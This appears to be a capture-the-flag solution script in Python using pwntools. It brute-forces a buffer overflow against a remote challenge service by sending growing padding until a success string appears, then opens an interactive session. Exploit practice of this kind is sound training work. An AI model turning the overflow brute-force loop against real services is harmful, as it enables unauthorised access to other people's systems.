#!/usr/bin/python3

from binascii import unhexlify
from pwn import *

PROGRAM_NAME = "bestsec"
ENCODING = "ascii"
REMOTE = 0
OFFSET = 16


def io_beg():
	return remote('plzpwn.me', 2002)
	#process('./bestsecurity')
	
def io_rdy(x):
	return x.recvuntil("AAAAw, yeah...".encode(ENCODING), timeout = 10).decode(ENCODING)

def main():
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			found = 0
			i = 1
			good_magic = "calm down"
			
			while(not(found)):
				io = io_beg()
				io_rdy(io)
				payload = "1234"*i
				io.sendline(payload.encode(ENCODING))
				inbound = io.recvall(timeout=5).decode(ENCODING)
				if(inbound.find(good_magic) != -1):
					print(inbound)
					found = 1
				else:
					i = i+1
					
				print("[i: "+ str(i)+"][found: "+str(found)+"]")
				
			stage = stage + 1
		
		if(stage == 1):
			io = io_beg()
			io_rdy(io)
			payload = "1234"*i
			
			io.sendline(payload.encode(ENCODING))
			
			io.interactive()

		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()
